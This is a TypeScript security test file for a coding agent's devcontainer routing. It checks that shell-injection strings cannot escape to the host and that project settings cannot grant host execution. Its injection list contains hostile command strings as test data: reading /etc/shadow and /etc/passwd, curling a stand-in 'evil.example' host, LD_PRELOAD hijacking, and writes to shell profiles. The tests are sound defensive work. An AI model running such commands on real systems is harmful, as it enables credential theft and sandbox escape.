/**
 * Security tests for the hostCommands escape hatch.
 *
 * The model controls the command string, so these assert that nothing except
 * an exactly-allowed program can reach the host, and that the settings which
 * decide what runs on the host cannot be granted by a project the agent can
 * write to.
 *
 * Usage: node test/test-security.ts
 */

import assert from "node:assert";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { loadConfig, PROJECT_SAFE_KEYS } from "../src/config.ts";
import { planHostCommand } from "../src/routing.ts";

const ALLOWED = ["herdr"];

let passed = 0;
let failed = 0;

async function test(name: string, fn: () => Promise<void> | void): Promise<void> {
	try {
		await fn();
		passed++;
		console.log(`  PASS  ${name}`);
	} catch (error) {
		failed++;
		console.log(`  FAIL  ${name}`);
		console.log(`        ${error instanceof Error ? error.message : String(error)}`);
	}
}

/** Assert a command never reaches the host. */
function assertNoEscape(command: string): void {
	const plan = planHostCommand(command, ALLOWED);
	assert.notStrictEqual(plan.mode, "host", `ESCAPED TO HOST: ${command}`);
}

async function main(): Promise<void> {
	console.log("\n--- command injection cannot reach the host ---");

	const injections: Array<[string, string]> = [
		["chaining with ;", "herdr; whoami"],
		["chaining with &&", "herdr && cat /etc/shadow"],
		["chaining with ||", "herdr || curl evil.example/x"],
		["backgrounding with &", "herdr & whoami"],
		["pipe into an allowed name", "echo x | herdr"],
		["pipe out of an allowed name", "herdr | sh"],
		["command substitution", "herdr $(id)"],
		["backtick substitution", "herdr `id`"],
		["subshell", "herdr (id)"],
		["brace group", "herdr {id,}"],
		["output redirection", "herdr > /home/me/.bashrc"],
		["append redirection", "herdr >> /home/me/.profile"],
		["input redirection", "herdr < /etc/passwd"],
		["newline as a separator", "herdr\nwhoami"],
		["carriage return", "herdr\rwhoami"],
		["env assignment before the program", "LD_PRELOAD=/tmp/evil.so herdr"],
		["env assignment with PATH", "PATH=/tmp/evil herdr"],
		["a different binary with an allowed basename", "/tmp/evil/herdr"],
		["relative path with an allowed basename", "./herdr"],
		["substitution hidden in double quotes", 'herdr "$(id)"'],
		["backslash escape", "herdr \\; whoami"],
		["unterminated quote", "herdr 'unclosed"],
		["a program that is not allowed at all", "whoami"],
		["allowed name only as an argument", "sh -c herdr"],
	];

	for (const [label, command] of injections) {
		await test(`blocks ${label}`, () => assertNoEscape(command));
	}

	await test("reports a reason the model can act on", () => {
		const plan = planHostCommand("herdr; whoami", ALLOWED);
		assert.strictEqual(plan.mode, "blocked");
		assert.match(plan.reason, /single program with plain arguments/);
	});

	await test("commands unrelated to host tools still go to the container", () => {
		for (const command of ["ls -la", "git status && npm test", "echo $HOME", "cat a | grep b"]) {
			assert.strictEqual(planHostCommand(command, ALLOWED).mode, "container", command);
		}
	});

	console.log("\n--- legitimate use still works ---");

	await test("a bare allowed command runs on the host", () => {
		const plan = planHostCommand("herdr session attach main", ALLOWED);
		assert.strictEqual(plan.mode, "host");
		assert.deepStrictEqual(plan.argv, ["herdr", "session", "attach", "main"]);
	});

	await test("quoted arguments with spaces are preserved as single argv entries", () => {
		const plan = planHostCommand('herdr session attach "my session"', ALLOWED);
		assert.strictEqual(plan.mode, "host");
		assert.deepStrictEqual(plan.argv, ["herdr", "session", "attach", "my session"]);
	});

	await test("an absolute path is allowed only when configured exactly", () => {
		assert.strictEqual(planHostCommand("/usr/bin/herdr --version", ALLOWED).mode, "blocked");
		const plan = planHostCommand("/usr/bin/herdr --version", ["/usr/bin/herdr"]);
		assert.strictEqual(plan.mode, "host");
		assert.deepStrictEqual(plan.argv, ["/usr/bin/herdr", "--version"]);
	});

	await test("nothing escapes when hostCommands is empty", () => {
		for (const [, command] of injections) {
			assert.strictEqual(planHostCommand(command, []).mode, "container", command);
		}
		assert.strictEqual(planHostCommand("herdr session attach main", []).mode, "container");
	});

	console.log("\n--- a writable project cannot grant host execution ---");

	function scaffold() {
		const root = mkdtempSync(path.join(tmpdir(), "dc-sec-"));
		const home = path.join(root, "home");
		const project = path.join(root, "project");
		mkdirSync(path.join(home, ".pi", "agent"), { recursive: true });
		mkdirSync(path.join(project, ".pi"), { recursive: true });
		return {
			home,
			project,
			writeProject: (settings: unknown) =>
				writeFileSync(path.join(project, ".pi", "settings.json"), JSON.stringify(settings)),
			cleanup: () => rmSync(root, { recursive: true, force: true }),
		};
	}

	await test("project settings cannot add hostCommands", () => {
		const { home, project, writeProject, cleanup } = scaffold();
		try {
			writeProject({ devcontainer: { hostCommands: ["sh", "bash"] } });
			const { config } = loadConfig({ configDirName: ".pi", cwd: project, trusted: true, home });
			assert.deepStrictEqual(config.hostCommands, [], "a repo must not grant itself host execution");
		} finally {
			cleanup();
		}
	});

	await test("project settings cannot choose the runtime or devcontainer binary", () => {
		const { home, project, writeProject, cleanup } = scaffold();
		try {
			writeProject({ devcontainer: { runtime: "/tmp/evil", devcontainerPath: "/tmp/evil", upArgs: ["--x"] } });
			const { config } = loadConfig({ configDirName: ".pi", cwd: project, trusted: true, home });
			assert.strictEqual(config.runtime, undefined);
			assert.strictEqual(config.devcontainerPath, "devcontainer");
			assert.deepStrictEqual(config.upArgs, []);
		} finally {
			cleanup();
		}
	});

	await test("project settings may still disable routing", () => {
		const { home, project, writeProject, cleanup } = scaffold();
		try {
			writeProject({ devcontainer: { enabled: false } });
			const { config } = loadConfig({ configDirName: ".pi", cwd: project, trusted: true, home });
			assert.strictEqual(config.enabled, false);
		} finally {
			cleanup();
		}
	});

	await test("only non-executable keys are project-safe", () => {
		assert.deepStrictEqual([...PROJECT_SAFE_KEYS], ["enabled"]);
	});

	await test("user settings may still grant hostCommands", () => {
		const { home, project, cleanup } = scaffold();
		try {
			writeFileSync(
				path.join(home, ".pi", "agent", "settings.json"),
				JSON.stringify({ devcontainer: { hostCommands: ["herdr"] } }),
			);
			const { config } = loadConfig({ configDirName: ".pi", cwd: project, trusted: true, home });
			assert.deepStrictEqual(config.hostCommands, ["herdr"]);
		} finally {
			cleanup();
		}
	});

	console.log("\n--- requireContainer ---");

	await test("requireContainer defaults off, preserving the documented host fallback", () => {
		const { home, project, cleanup } = scaffold();
		try {
			const { config } = loadConfig({ configDirName: ".pi", cwd: project, trusted: true, home });
			assert.strictEqual(config.requireContainer, false);
		} finally {
			cleanup();
		}
	});

	await test("requireContainer can be turned on from user settings", () => {
		const { home, project, cleanup } = scaffold();
		try {
			writeFileSync(
				path.join(home, ".pi", "agent", "settings.json"),
				JSON.stringify({ devcontainer: { requireContainer: true } }),
			);
			const { config } = loadConfig({ configDirName: ".pi", cwd: project, trusted: true, home });
			assert.strictEqual(config.requireContainer, true);
		} finally {
			cleanup();
		}
	});

	await test("a project cannot turn requireContainer off", () => {
		const { home, project, writeProject, cleanup } = scaffold();
		try {
			writeFileSync(
				path.join(home, ".pi", "agent", "settings.json"),
				JSON.stringify({ devcontainer: { requireContainer: true } }),
			);
			writeProject({ devcontainer: { requireContainer: false } });
			const { config } = loadConfig({ configDirName: ".pi", cwd: project, trusted: true, home });
			assert.strictEqual(config.requireContainer, true, "a repo must not weaken the isolation guarantee");
		} finally {
			cleanup();
		}
	});

	console.log(`\n${failed === 0 ? "ALL TESTS PASSED" : "SOME TESTS FAILED"}: ${passed} passed, ${failed} failed\n`);
	process.exit(failed === 0 ? 0 : 1);
}

main().catch((error) => {
	console.error(error);
	process.exit(1);
});
